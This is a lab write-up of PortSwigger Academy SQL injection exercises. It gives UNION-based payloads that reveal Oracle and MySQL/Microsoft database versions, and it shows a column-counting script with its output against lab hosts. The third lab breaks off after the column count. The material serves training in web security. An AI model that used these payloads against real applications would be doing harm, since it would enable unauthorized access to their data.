# PortSwigger Academy- SQL Injection

- Author: [Mateusz Głuchowski](https://github.com/hue1337)
- Site: [PortSwigger Academy](https://portswigger.net/)

# Lab: SQL injection attack, querying the database type and version on Oracle



## Steps:
1. Determining amount of columns by using our script `columns_amount.py`.

    ```bash
    python3 columns_amount.py --url https://0aaa00a503c074e683b2504f00b50012.web-security-academy.net/ --param category --amount 6
    ```

2. Looking into Oracle DB documentation to find the way how to determine the version.

    ```sql
    SQL>
    SQL>
    SQL> select banner from v$version;

    BANNER
    ----------------------------------------------------------------
    Oracle Database 10g Express Edition Release 10.2.0.1.0 - Product
    PL/SQL Release 10.2.0.1.0 - Production
    CORE    10.2.0.1.0      Production
    TNS for 32-bit Windows: Version 10.2.0.1.0 - Production
    NLSRTL Version 10.2.0.1.0 - Production

    SQL>

    ```

3. Preparing the payload:

    ```sql
    ' UNION SELECT banner, null FROM v$version -- -
    ```

4. Sending the request and completing the lab.


<div style="page-break-after: always;"></div>

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Steps:

1. Using our script (`columns_amount.py`) to determine amount of columns:
    
    ```bash
    python3 columns_amount.py --url https://0a5b005e038c2686836637ae00cd00c9.web-security-academy.net/filter?category=Accessories --param category --amount 5

    ```

2. Checking Microsoft documentation on determing DB version:
    - https://learn.microsoft.com/en-us/troubleshoot/sql/releases/find-my-sql-version

3. Preparing the payload:

    ```sql
    ' UNION SELECT @@version, null-- -
    ```

4. Sending the payload and completing the lab.


# Lab: SQL injection attack, listing the database contents on non-Oracle databases

1. Determining amount of columns:

    ``` bash
    ┌──(hue1337㉿kali)-[~/…/GitHub/PortSwigger/SQL_Injection/Scripts]
    └─$ python3 columns_amount.py --url https://0abd005504f664e280cc53bc001400b4.web-security-academy.net/ --param category --amount 5
    https://0abd005504f664e280cc53bc001400b4.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
    Status code: 500
    Amount: 5
    Tmp_val: 2

    Status code: 500
    Amount: 4
    Tmp_val: 1

    Status code: 500
    Amount: 3
    Tmp_val: 1

    Status code: 200
    Amount: 2
    Tmp_val: 1

    [+] Amount of columns: 2 
                                
    ```